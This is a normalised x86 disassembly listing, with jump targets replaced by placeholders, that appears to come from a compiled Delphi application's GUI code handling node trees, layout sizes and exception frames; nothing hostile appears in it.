mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
dec al
je r-xdata
mov ebx ebp
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp ] eax
jmp r-xdata
dec al
jne r-xdata
mov eax [ ebx + 0x18 ]
call sub_4991dc
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
sub_498e04
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov ebp [ esp + 0x8 ]
sub ebp [ esp ]
jmp r-xdata
mov ebp [ esp + 0xc ]
sub ebp [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebp
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_498c94
dec eax
jne r-xdata
mov eax edi
mov edx [ esi + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi [ esi + 0x14 ]
mov eax esi
call sub_4991dc
mov ebp eax
mov eax esi
call sub_498cf0
sub ebp eax
jmp r-xdata
mov eax edx
call sub_4991dc
mov ebp eax
mov ebp [ eax + 0x68 ]
jmp r-xdata
sub_498ebc
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_498c94
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_4992e0
mov ebx eax
movzx eax [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_498e04
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_498c94
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_498e04
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_498cf0
mov edx eax
add edx esi
mov eax ebx
call sub_499204
mov edx edi
mov eax ebx
call sub_499204
jmp r-xdata
mov eax ebx
call sub_499060
mov eax ebx
call sub_4992b8
mov ebx eax
test ebx ebx
jne r-xdata
sub_498f64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
xor edx edx
call sub_449d2c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_449d2c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
sub_498fac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb7
call sub_4483f8
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_49901d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_48ede4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_499030
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_4992b8
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_499060
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
mov [ eax + 0x8c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_498e04
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_498e04
mov esi eax
push ebp
call sub_499030
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4992b8
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_498d80
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_498d80
mov ecx ebx
pop edx
call sub_432b40
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_48d83c
mov eax [ ebp - 0x4 ]
call sub_4991dc
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_4991dc
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4991dc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_4991dc
push ebx
mov ebx eax
mov eax ebx
call sub_498cb8
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_498c20
test al al
je r-xdata
mov eax ebx
call sub_498cf0
pop ebx
retn
sub_499218
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_499204
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_498c80
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_499208
mov esi eax
mov edx edi
mov eax esi
call sub_499218
sub_499258
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4991dc
mov edi eax
mov eax ebx
call sub_498cf0
cmp edi eax
jl r-xdata
mov eax esi
call sub_498ebc
mov edi [ esi + 0x1c ]
push edi
push sub_49b178
mov edx esi
mov eax edi
call sub_49959c
mov eax ebx
call sub_4991dc
mov edi eax
mov eax esi
call sub_498d38
cmp edi eax
jle r-xdata
mov eax ebx
call sub_499258
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_4992c4
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_498cb8
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_4992ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_448180
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x80000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_448694
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_498c44
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dd60
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_473a8c
mov edx eax
mov eax ebx
call sub_46def0
mov eax [ ebp - 0x4 ]
call sub_4994c4
xor eax eax
push ebp
push sub_4993f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_492534
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_498ebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499400
mov eax [ ebp - 0x4 ]
call sub_4994c8
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4924f8
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_499400
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_49b188
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_499454
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
cmp [ esi + 0x32 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_49a758
mov eax [ esi + 0x10 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4994dc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_4994dc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_4994dc
pop ecx
sub_499534
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_4994dc
pop ecx
sub_499560
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_499560
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_499560
pop ecx
sub_4995b4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_499534
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_498e04
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_498e04
push eax
mov edx 0x1
mov eax ebx
call sub_498d80
push eax
mov edx 0x2
mov eax ebx
call sub_498d80
pop edx
pop ecx
call sub_432b40
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_49963c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_499060
jmp r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_432b40
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_48d83c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_498c44
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_499534
mov [ ebp - 0x8 ] eax
movzx eax [ ebp - 0x1 ]
movzx eax [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_498c80
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_49a7f4
mov edx esi
mov eax ebx
call sub_499534
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_48df30
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_498c44
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
movzx eax [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
movzx eax [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_48df1c
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
movzx edx [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_498e04
mov edx eax
mov eax edi
call sub_499204
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_498e04
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_498e04
mov edx eax
mov eax edi
call sub_499204
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_498e04
mov [ ebx + 0x68 ] eax
jmp r-xdata
movzx edx [ ebp - 0x9 ]
push edx
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_499858
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_499a00
jmp r-xdata
sub_499858
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_498c44
mov ebx eax
movzx eax [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_4991dc
mov edx eax
mov eax ebx
call sub_499204
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_499204
mov eax [ esi + 0x64 ]
call sub_4991dc
mov [ esi + 0x68 ] eax
movzx eax [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_49ab78
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_49959c
mov eax [ esi + 0x64 ]
call sub_4991dc
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_49ab78
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_49959c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_49b040
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_49959c
mov eax [ esi + 0x64 ]
call sub_4991dc
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_49b178
xor edx edx
mov eax esi
call sub_49959c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_499204
adc edx 0x0
mov eax ebx
call sub_498ebc
mov eax ebx
call sub_499258
push esi
push sub_49b178
xor edx edx
mov eax esi
call sub_49959c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_499a00
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_498ebc
mov eax [ ebx + 0x14 ]
call sub_499258
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_499a78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov edx 0x1
mov eax esi
call sub_498d80
mov edi eax
mov edx 0x2
mov eax esi
call sub_498d80
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
add edx [ ebp - 0xc ]
cmp eax edx
jg r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx 0x1
mov eax esi
call sub_498e04
add edi eax
cmp edi [ ebx + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax esi
call sub_498e04
add eax [ ebp - 0xc ]
cmp eax [ ebx ]
jl r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
cmp edx [ ebx ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
sub_499b7c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov edi edx
mov ebp eax
mov eax [ ebp + 0x14 ]
call sub_492534
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
mov edx esi
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
mov ecx esp
call sub_432a5c
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x8 ]
mov edx esp
call sub_432a8c
test al al
jne r-xdata
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
sub_499c04
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_4991dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4991dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_4991dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x40 ]
test al al
je r-xdata
mov eax ebx
call sub_4991dc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
